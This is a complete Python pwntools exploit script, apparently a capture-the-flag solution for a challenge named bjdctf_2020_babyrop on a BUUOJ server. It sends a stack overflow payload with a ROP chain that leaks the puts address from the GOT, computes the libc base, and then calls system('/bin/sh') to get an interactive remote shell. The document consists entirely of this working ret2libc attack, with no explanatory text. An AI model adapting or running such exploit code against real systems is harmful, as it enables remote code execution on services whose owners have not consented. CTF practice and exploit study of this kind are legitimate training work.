from pwn import *
context(log_level='DEBUG')
io = remote('node3.buuoj.cn',27222)
#io = process("./bjdctf_2020_babyrop")
elf = ELF('./bjdctf_2020_babyrop')
libc = ELF('libc-x64-2.23.so')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']
pop_rdi_ret = 0x0000400733 

payload = 'a'*(0x20+0x8)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
io.recv()
io.sendline(payload)


puts_add = u64(io.recv(6).ljust(8, '\x00'))

base = puts_add - libc.sym['puts']
sys_add = base + libc.sym['system']
bin_sh = base + next(libc.search('/bin/sh'))

payload = 'a'*(0x20+0x8)+p64(pop_rdi_ret) +p64(bin_sh)+p64(sys_add)
io.send(payload)
io.recv()
io.interactive()